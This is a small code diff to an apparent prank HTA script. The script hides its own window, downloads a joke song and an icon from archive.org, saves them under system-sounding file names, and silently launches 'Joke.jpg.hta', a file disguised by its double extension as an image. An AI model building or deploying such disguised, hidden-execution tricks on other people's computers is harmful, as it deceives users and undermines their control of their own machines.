@@ -40,7 +40,6 @@
     window.resizeTo 0,0
     
     Rem Download some things
-    On Error Resume Next
     xHttp.Open "GET", "https://ia801409.us.archive.org/12/items/rebeccablackfriday_202010/Joke.mp3", False
     xHttp.Send
     With bStrm
@@ -50,7 +49,6 @@
         .savetofile WshShell.CurrentDirectory & "\syserror.mp3", 2
     End With
 
-    On Error Resume Next
     xHttp.Open "GET", "https://ia801400.us.archive.org/32/items/Dll_Icon/Joke.ico", False
     xHttp.Send
     With bStrm
@@ -60,7 +58,7 @@
         .savetofile WshShell.CurrentDirectory & "\sysinstall32.ico", 2
     End With
     
-    If fso.FileExists("syserror.mp3") or fso.FileExists("syserror.mp3") Then
+    If fso.FileExists("syserror.mp3") or fso.FileExists("sysinstall32.ico") Then
     	Return = WshShell.Run("Joke.jpg.hta", 0, false)
     	window.close
     End If
